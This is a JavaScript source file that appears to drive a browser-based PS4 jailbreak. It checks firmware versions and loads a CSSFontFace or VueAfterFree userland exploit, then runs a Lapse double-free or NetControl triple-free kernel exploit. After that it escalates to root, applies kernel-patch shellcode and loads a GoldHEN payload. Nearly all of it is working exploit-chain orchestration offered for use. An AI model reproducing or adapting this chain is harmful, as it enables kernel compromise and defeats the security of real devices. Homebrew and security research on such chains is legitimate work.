function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

// Progress tracking
const JB_STEPS = [
  { id: 1, name: 'Detect FW', total: 8 },
  { id: 2, name: 'Load Scripts', total: 8 },
  { id: 3, name: 'Userland Exploit', total: 8 },
  { id: 4, name: 'Kernel Exploit', total: 8 },
  { id: 5, name: 'Jailbreak', total: 8 },
  { id: 6, name: 'Kernel Patches', total: 8 },
  { id: 7, name: 'Load Payload', total: 8 },
  { id: 8, name: 'Complete', total: 8 },
];

function logProgress(step, msg, type = 'info') {
  const stepInfo = JB_STEPS.find(s => s.id === step);
  if (stepInfo) {
    logger.info(`[${step}/${stepInfo.total}] ${stepInfo.name}: ${msg}`);
  } else {
    logger.info(msg);
  }
}

async function doJb() {
  if (typeof logger === "undefined") {
    await load_script("src/misc.js");
  }

  try {
    logProgress(1, 'Initializing...');
    version.init();

    const FW = version.major * 100 + (version.minor || 0);

    logger.info(`FW detected: ${version} (parsed: ${FW}, hex: 0x${FW.toString(16)})`);
    logger.debug(`exploitChain: ${exploitChain}`);

    // Check if FW is supported
    if (FW < 101 || FW > 1300) {
      const supportedList = [
        '1.01-6.72', '7.00-7.55', '8.00-8.52', '9.00-9.60',
        '10.00-10.71', '11.00-11.02', '11.50', '11.52',
        '12.00', '12.02', '12.50', '12.52', '13.00'
      ].join(', ');
      logger.error(`❌ FW ${version} is NOT supported!`);
      logger.error(`Supported FW: ${supportedList}`);
      logger.error(`Min: 1.01 | Max: 13.00`);
      throw new Error(`FW ${version} not supported`);
    }

    // Check if selected kernel exploit supports this FW
    if (exploitChain === "lapse" && FW >= 1280) {
      logger.warn(`Lapse exploit is patched from FW 12.50+.`);
      logger.warn("Switching to NetControl exploit...");
      exploitChain = "netctrl";
      localStorage.setItem("exploitChain", "netctrl");
      document.getElementById("netctrl-exploit").checked = true;
    }

    logProgress(1, `FW ${version} verified ✓`);
    logger.debug(`Console type: ${version.console}`);

    logProgress(2, 'Loading scripts...');
    switch (version.console) {
      case 4:
        await load_script("src/ps4/constants.js");
        logger.debug("Loaded: constants.js");
        await load_script("src/ps4/userland.js");
        logger.debug("Loaded: userland.js");
        await load_script("src/ps4/vueafterfree.js");
        logger.debug("Loaded: vueafterfree.js");
        break;
      case 5:
        logger.error("PS5 support is not yet implemented");
        throw new Error("PS5 not supported");
      default:
        logger.error(`Unsupported console ${version.console}`);
        throw new Error(`Unsupported console: ${version.console}`);
    }
    logProgress(2, 'Scripts loaded ✓');

    // Validate required offsets exist
    if (typeof constants.KPATCH === "undefined" && typeof constants.SYSENT_661 === "undefined" && typeof constants.KL_LOCK === "undefined") {
      logger.error(`No kernel offsets found for FW ${version}.`);
      logger.error("This firmware version is not yet supported.");
      throw new Error(`No kernel offsets for FW ${version}`);
    }

    // Log critical constants for this FW
    logger.debug(`Constants for FW ${version}:`);
    logger.debug(`  EVF_OFFSET: 0x${(constants.EVF_OFFSET || 0).toString(16)}`);
    logger.debug(`  SYSENT_661: 0x${(constants.SYSENT_661 || 0).toString(16)}`);
    logger.debug(`  KPATCH: ${constants.KPATCH || "undefined"}`);
    logger.debug(`  KPATCH_SHELLCODE length: ${constants.KPATCH_SHELLCODE ? constants.KPATCH_SHELLCODE.length : 0} chars`);
    logger.debug(`  KPATCH_MMAP_OFFSETS: ${constants.KPATCH_MMAP_OFFSETS ? JSON.stringify(constants.KPATCH_MMAP_OFFSETS.map(x => "0x" + x.toString(16))) : "undefined"}`);
    logger.debug(`  PRISON0: 0x${(constants.PRISON0 || 0).toString(16)}`);
    logger.debug(`  ROOTVNODE: 0x${(constants.ROOTVNODE || 0).toString(16)}`);

    logProgress(3, 'Starting userland exploit...');
    logger.info("===USERLAND===");

    let rw = undefined;
    let usedVAF = false;

    if (arw.master === undefined) {
      try {
        logger.info(`Using CSSFontFace path (FW ${FW})`);
        rw = await init_rw();
        logger.info("CSSFontFace exploit succeeded");
      } catch (e) {
        logger.error(`CSSFontFace failed: ${e.message}`);

        if (FW >= 1180) {
          logger.info("Falling back to VueAfterFree path...");
          try {
            await init_vaf_rw();
            usedVAF = true;
            logger.info("VueAfterFree exploit succeeded");
          } catch (e2) {
            logger.error(`VueAfterFree also failed: ${e2.message}`);
            throw new Error(`Both CSSFontFace and VueAfterFree failed: ${e.message} / ${e2.message}`);
          }
        } else {
          throw e;
        }
      }
    }

    if (usedVAF) {
      await init_arw(undefined);
    } else {
      init_arw(rw);
    }
    init_rop();
    init_syscalls();

    logProgress(3, 'Userland exploit completed ✓');
    logger.info("===END===");

    logProgress(4, 'Loading kernel scripts...');
    await load_script("src/loader.js");
    logger.debug("Loaded: loader.js");
    await load_script("src/workers.js");
    logger.debug("Loaded: workers.js");

    switch (version.console) {
      case 4:
        await load_script("src/ps4/kernel.js");
        logger.debug("Loaded: kernel.js");
        break;
      case 5:
        logger.error("PS5 support is not yet implemented");
        throw new Error("PS5 not supported");
      default:
        logger.error(`Unsupported console ${version.console}`);
        throw new Error(`Unsupported console: ${version.console}`);
    }

    await load_script(`src/${exploitChain}.js`);
    logger.debug(`Loaded: ${exploitChain}.js`);

    logProgress(4, 'Kernel scripts loaded ✓');
    logProgress(5, `Starting ${exploitChain} kernel exploit...`);
    logger.info(`===${exploitChain.toUpperCase()}===`);

    const MAX_KERNEL_ATTEMPTS = 3;
    let kernelSuccess = false;

    for (let attempt = 1; attempt <= MAX_KERNEL_ATTEMPTS; attempt++) {
      try {
        logger.info(`Kernel exploit attempt ${attempt}/${MAX_KERNEL_ATTEMPTS}`);

        if (exploitChain == "lapse") {
          init();
          await setup();
          await double_free_reqs2();
          leak_kaddrs();
          double_free_reqs1();
          make_karw();

          // Increase reference counts for the pipes
          inc_karw_pipe_refcnt();

          logger.info("Corrupted context cleanup started...");

          // Remove pktinfo pointers
          remove_pktinfo_from_so(pktopts_twins[0]);

          // Remove rthdr pointers
          remove_rthdr_from_so(pktopts_twins[1]);
          remove_rthdr_from_so(rthdr_twins[0]);

          logger.info("Corrupted context cleanup completed !");
        } else {
          init();
          await setup();
          await ucred_triple_free();
          leak_kqueue();
          await make_karw();

          inc_karw_pipe_refcnt();

          logger.info("Corrupted context cleanup started...");

          // Remove rthdr pointers from triplets
          for (let i = 0; i < triplets.length; i++) {
            remove_rthdr_from_so(triplets[i]);
          }

          // Remove triple freed file from free list
          remove_uaf_file();

          logger.info("Corrupted context cleanup completed !");
        }

        kernelSuccess = true;
        logProgress(5, `Kernel exploit succeeded ✓ (attempt ${attempt})`);
        break;

      } catch (e) {
        logger.error(`Kernel exploit attempt ${attempt} failed: ${e.message}`);

        if (attempt < MAX_KERNEL_ATTEMPTS) {
          logger.info(`Retrying in 1 second...`);
          await new Promise(r => setTimeout(r, 1000));
        } else {
          throw new Error(`Kernel exploit failed after ${MAX_KERNEL_ATTEMPTS} attempts: ${e.message}`);
        }
      } finally {
        try { cleanup(); } catch (e) { logger.error(`Cleanup failed: ${e.message}`); }
      }
    }

    if (!kernelSuccess) {
      throw new Error("Kernel exploit failed");
    }

    find_all_proc();

    logProgress(6, 'Running jailbreak...');
    // Avoid reapplying if already done
    if (fn.setuid.invoke(0) === -1) {
      logger.info("Running jailbreak()...");
      jailbreak();
      logProgress(6, 'Jailbreak completed ✓');
    } else {
      logger.info("Already jailbroken (setuid(0) succeeded)");
      logProgress(6, 'Already jailbroken ✓');
    }

    logProgress(7, 'Applying kernel patches...');
    if (constants.KPATCH_SHELLCODE) {
      logger.info(`KPATCH_SHELLCODE available (${constants.KPATCH_SHELLCODE.length} chars)`);
      try {
        const shellcode = new Uint8Array(constants.KPATCH_SHELLCODE.match(/.{1,2}/g).map(b => parseInt(b, 16)));
        logger.debug(`KPATCH_SHELLCODE binary size: ${shellcode.length} bytes`);
        kernel_patches(shellcode);
        logger.info("KPATCH_SHELLCODE applied successfully");
      } catch (e) {
        logger.error(`Kernel shellcode patch failed: ${e.message}`);
        throw e;
      }
    } else if (constants.KPATCH) {
      logger.info(`KPATCH file available: ${constants.KPATCH}`);
      try {
        const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
        if (!kpatches_rsp.ok) throw new Error(`Failed to fetch kernel patches: ${kpatches_rsp.status}`);
        const kpatches_buf = await kpatches_rsp.arrayBuffer();
        const kpatches_u8 = new Uint8Array(kpatches_buf);
        logger.debug(`KPATCH file size: ${kpatches_u8.length} bytes`);
        kernel_patches(kpatches_u8);
        logger.info("KPATCH file applied successfully");
      } catch (e) {
        logger.error(`Kernel patches load failed: ${e.message}`);
        throw e;
      }
    } else {
      logger.warn("No KPATCH_SHELLCODE or KPATCH found - skipping kernel patches");
    }
    logProgress(7, 'Kernel patches applied ✓');

    logProgress(8, 'Loading payload...');
    // GoldHEN v2.4b18 SHA256: c6329401d1810e16c84e6474ac30977dbdc951987c10cdb559370de7d59db0b0
    const EXPECTED_PAYLOAD_SHA256 = "c6329401d1810e16c84e6474ac30977dbdc951987c10cdb559370de7d59db0b0";
    const MAX_PAYLOAD_ATTEMPTS = 2;
    let payloadSuccess = false;

    for (let attempt = 1; attempt <= MAX_PAYLOAD_ATTEMPTS; attempt++) {
      try {
        logger.info(`Payload load attempt ${attempt}/${MAX_PAYLOAD_ATTEMPTS}`);
        const bin_rsp = await fetch("src/payload.bin");
        if (!bin_rsp.ok) throw new Error(`Failed to fetch payload: ${bin_rsp.status}`);
        const bin_buf = await bin_rsp.arrayBuffer();
        const bin_u8 = new Uint8Array(bin_buf);
        logger.debug(`Payload size: ${bin_u8.length} bytes`);

        // Verify payload integrity
        const hash_buf = await crypto.subtle.digest("SHA-256", bin_u8);
        const hash_u8 = new Uint8Array(hash_buf);
        const hash_hex = Array.from(hash_u8).map(b => b.toString(16).padStart(2, '0')).join('');
        if (hash_hex !== EXPECTED_PAYLOAD_SHA256) {
          throw new Error(`Payload SHA256 mismatch! Expected: ${EXPECTED_PAYLOAD_SHA256}, Got: ${hash_hex}`);
        }
        logger.debug(`Payload SHA256 verified: ${hash_hex}`);

        load_bin(bin_u8);
        logger.info("Payload loaded successfully");
        payloadSuccess = true;
        break;
      } catch (e) {
        logger.error(`Payload load attempt ${attempt} failed: ${e.message}`);
        if (attempt < MAX_PAYLOAD_ATTEMPTS) {
          logger.info(`Retrying payload load...`);
          await new Promise(r => setTimeout(r, 500));
        }
      }
    }

    if (!payloadSuccess) {
      logger.warn("Payload load failed - continuing without payload");
    }
    logProgress(8, payloadSuccess ? 'Payload loaded ✓' : 'Payload skipped');

    logProgress(8, 'Jailbreak complete!');
    logger.info("===END===");
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
    throw e;
  }
}
